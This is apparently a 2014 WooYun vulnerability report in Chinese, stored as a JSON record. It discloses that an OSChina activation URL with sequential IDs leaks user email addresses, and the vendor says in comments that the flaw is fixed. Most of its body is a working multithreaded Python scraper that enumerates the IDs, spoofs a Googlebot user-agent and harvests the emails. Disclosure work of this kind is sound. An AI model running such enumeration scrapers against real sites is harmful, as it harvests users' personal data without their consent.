{"id": 41773, "wybug_id": "wooyun-2014-087711", "wybug_title": "开源中国某处设计不当导致用户邮箱泄露（附测试程序）", "wybug_corp": "开源中国", "wybug_author": "Morker", "wybug_date": "2014-12-18 18:45", "wybug_open_date": "2014-12-23 18:46", "wybug_type": "网络设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "7", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-23：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： .. 详细说明：  ..   漏洞证明：  泄露地址：\nhttp://www.oschina.net/home/activating?id=1\n\n\n然后用python简单爬了爬\n\n在学python，就贴贴代码交流交流：\n#!/usr/bin/env python#coding:utf-8import threadingimport re,timeimport requestsfrom Queue import Queuedef getUrl():    url = []    for i in xrange(1,50):     #这里就时想要获取多少邮箱了，我看的时候，有两百多万用户吧！        page = \"http://www.oschina.net/home/activating?id=\" + str(i)        url.append(page)    print \"---------------Scan starting---------------\"    return urlclass GetMail(threading.Thread):    def __init__(self,queue):        threading.Thread.__init__(self)        self.queue = queue        self.headers = {'User-Agent' : 'Mozilla/5.0 (compatible; Googlebot/2.1; +[url]http://www.google.com/bot.html[/url])'}        self.key = re.compile(r'<td>(.*?@.*?)</td>')        self.start()    def run(self):        while True:            if con.acquire():                if self.queue.empty():                    con.release()                    break                else:                    page = self.queue.get()                    code = requests.get(page,headers=self.headers).text                    mail = self.key.findall(code)                    if len(mail) == 1:                        print mail[0]                    else:                        pass                con.release()con = threading.Lock()def main():    threads = []    pages = getUrl()    queue = Queue()    for i in range(len(pages)):        queue.put(pages[i])    for i in range(50):        t = GetMail(queue)        threads.append(t)    for i in threads:        i.join()    print \"---------------Scan ebding---------------\"if __name__ == \"__main__\":    main()#url = \"http://www.oschina.net/home/activating?id=2293091\"#headers = {'User-Agent' : 'Mozilla/5.0 (compatible; Googlebot/2.1; +[url]http://www.google.com/bot.html[/url])'}#code = requests.get(url,headers=headers).text#key = re.compile(r'<td>(.*?@.*?)</td>')#mail = key.findall(code)#print mail\n   修复方案：  ...   版权声明：转载请注明来源 Morker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-23 18:46 厂商回复：  最新状态： 2014-12-23：已处理，谢谢  ", "replys": "漏洞评价：\n评论\n     2014-12-24 06:58 |    \t\t开源中国(乌云厂商)\t\t \n  厂商已经主动忽略漏洞？ 我们什么时候主动忽略啊？    \n     2014-12-24 08:53 |    \t\tMorker \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:24        | 双手是最重要的、、、)\t\t \n  @开源中国 ...    \n     2014-12-25 09:10 |    \t\t开源中国(乌云厂商)\t\t \n  @Morker 已经修复此漏洞，给你留言了，给个地址吧：）    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}